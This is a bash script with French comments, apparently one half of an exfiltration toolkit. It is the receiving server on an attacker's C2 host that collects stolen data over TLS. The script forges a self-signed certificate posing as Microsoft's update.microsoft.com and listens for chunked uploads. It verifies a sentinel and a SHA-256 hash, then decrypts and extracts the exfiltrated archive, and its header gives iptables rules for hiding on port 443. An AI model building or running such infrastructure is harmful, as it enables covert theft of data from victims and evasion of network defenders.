#!/usr/bin/env bash
# =============================================================================
# exfil_recv.sh — Serveur de réception TLS (côté C2/VPS)
# Usage : bash exfil_recv.sh [port] [drop_dir]
#
# Fonctionnement :
#   1. Génère un certificat TLS auto-signé (CN générique) si absent
#   2. Lance une boucle TLS Python3 (ssl module) : une connexion = un bloc
#      → Python est utilisé ici car openssl s_server ferme la session
#        prématurément à cause du comportement stdin en mode non-interactif
#   3. Détecte le sentinel CIPHERFALL_DONE:<n>:<sha256>
#   4. Vérifie le nombre de blocs reçus et le SHA-256 du payload complet
#   5. Réassemble → déchiffre AES-256-CBC+PBKDF2 → extrait l'archive tar
#
# Pour écouter sur le port 443 sans root (iptables redirect) :
#   iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port <port>
#   iptables -t nat -A OUTPUT    -p tcp -d 127.0.0.1 --dport 443 -j REDIRECT --to-port <port>
#
# Structure de drop_dir après réception :
#   drop_dir/
#     exfil_cert.pem   ← certificat TLS généré
#     exfil_key.pem    ← clé privée
#     chunks/          ← blocs bruts (supprimés après réassemblage)
#     extracted/       ← contenu déchiffré et extrait
# =============================================================================

set -euo pipefail

# ── Configuration (doit correspondre à exfil_send.sh) ────────────────────────
readonly LISTEN_PORT="${1:-4443}"
readonly DROP_DIR="${2:-./exfil_drop}"
readonly AES_KEY="CHANGE_ME_32CHAR_SECRET_KEY_HERE"
readonly CERT_FILE="${DROP_DIR}/exfil_cert.pem"
readonly KEY_FILE="${DROP_DIR}/exfil_key.pem"
readonly CHUNK_DIR="${DROP_DIR}/chunks"
readonly EXTRACT_DIR="${DROP_DIR}/extracted"
readonly SENTINEL_PREFIX="CIPHERFALL_DONE"

# ── Helpers ───────────────────────────────────────────────────────────────────
_has()  { command -v "$1" &>/dev/null; }
_err()  { printf '[!] %s\n' "$*" >&2; exit 1; }
_info() { printf '[*] %s\n' "$*" >&2; }
_ok()   { printf '[+] %s\n' "$*" >&2; }

# ── Validation ────────────────────────────────────────────────────────────────
_has openssl   || _err "openssl requis"
_has python3   || _err "python3 requis"
_has tar       || _err "tar requis"
_has sha256sum || _err "sha256sum requis"

mkdir -p "$CHUNK_DIR" "$EXTRACT_DIR"
find "$CHUNK_DIR" -name "chunk_*.bin" -delete 2>/dev/null || true

# ── Étape 1 : certificat TLS auto-signé ──────────────────────────────────────
if [[ ! -f "$CERT_FILE" || ! -f "$KEY_FILE" ]]; then
    _info "Génération du certificat TLS..."
    openssl req -x509 \
        -newkey rsa:2048 \
        -keyout "$KEY_FILE" \
        -out "$CERT_FILE" \
        -days 365 \
        -nodes \
        -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=update.microsoft.com" \
        2>/dev/null
    chmod 600 "$KEY_FILE"
    _ok "Certificat : $CERT_FILE"
fi

# ── Étape 2 : boucle TLS Python (une connexion = un bloc) ────────────────────
# Protocole de sortie Python → bash (stdout) :
#   CHUNK:<n>:<bytes>   pour chaque bloc reçu
#   <sentinel_line>     quand le sentinel est détecté (termine le script Python)
_info "Écoute sur port ${LISTEN_PORT}..."

PY_SERVER=$(mktemp /tmp/.cf_srv_XXXXXX.py)
trap 'rm -f "$PY_SERVER"' EXIT

cat > "$PY_SERVER" << 'PYEOF'
import ssl, socket, sys, os

port, cert, key, chunk_dir, sentinel_prefix = sys.argv[1:]
port = int(port)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(cert, key)
ctx.check_hostname = False

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('', port))
srv.listen(1)

chunk_n = 0
while True:
    try:
        raw, _ = srv.accept()
    except KeyboardInterrupt:
        break
    try:
        tls = ctx.wrap_socket(raw, server_side=True)
        buf = bytearray()
        while True:
            data = tls.read(65536)
            if not data:
                break
            buf.extend(data)
        tls.close()
    except Exception:
        try: raw.close()
        except: pass
        continue
    if not buf:
        continue
    sb = sentinel_prefix.encode()
    if buf[:len(sb)] == sb:
        print(buf.decode('ascii', errors='replace').strip(), flush=True)
        break
    chunk_file = os.path.join(chunk_dir, f'chunk_{chunk_n:06d}.bin')
    with open(chunk_file, 'wb') as f:
        f.write(bytes(buf))
    chunk_n += 1
    print(f'CHUNK:{chunk_n}:{len(buf)}', flush=True)

srv.close()
PYEOF

sentinel_data=""
chunk_n=0

while IFS= read -r line; do
    if [[ "$line" == CHUNK:* ]]; then
        chunk_n=$(printf '%s' "$line" | cut -d: -f2)
        sz=$(printf '%s' "$line" | cut -d: -f3)
        _info "Bloc ${chunk_n} reçu (${sz} o)"
    else
        sentinel_data="$line"
    fi
done < <(python3 "$PY_SERVER" \
    "$LISTEN_PORT" "$CERT_FILE" "$KEY_FILE" "$CHUNK_DIR" "$SENTINEL_PREFIX")

# ── Étape 3 : vérification ────────────────────────────────────────────────────
[[ -n "$sentinel_data" ]] || _err "Aucun sentinel reçu — transfert interrompu ?"

IFS=':' read -r _ expected_chunks expected_hash <<< "$sentinel_data"
_ok "Sentinel reçu : ${expected_chunks} blocs attendus, SHA-256 : ${expected_hash}"

[[ "$chunk_n" -eq "$expected_chunks" ]] \
    || _err "Blocs reçus : ${chunk_n} / attendus : ${expected_chunks} — incomplet"
_ok "${chunk_n}/${expected_chunks} blocs — compte OK"

# ── Étape 4 : réassemblage + vérification SHA-256 ────────────────────────────
_info "Réassemblage..."
REASSEMBLED=$(mktemp "${DROP_DIR}/.reas_XXXXXX")
trap 'rm -f "$PY_SERVER" "$REASSEMBLED" 2>/dev/null || true' EXIT

cat "${CHUNK_DIR}"/chunk_*.bin > "$REASSEMBLED"

actual_hash=$(sha256sum "$REASSEMBLED" | awk '{print $1}')
[[ "$actual_hash" == "$expected_hash" ]] \
    || _err "SHA-256 invalide (reçu: ${actual_hash}) — payload corrompu"
_ok "Intégrité vérifiée : SHA-256 OK"

# ── Étape 5 : déchiffrement + extraction ─────────────────────────────────────
_info "Déchiffrement + extraction → ${EXTRACT_DIR}"
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -k "$AES_KEY" \
    < "$REASSEMBLED" \
    | tar xzf - -C "$EXTRACT_DIR"

rm -f "$REASSEMBLED" "${CHUNK_DIR}"/chunk_*.bin
_ok "Extraction terminée : ${EXTRACT_DIR}"
_ok "Session complète — ${chunk_n} blocs, SHA-256 vérifié"
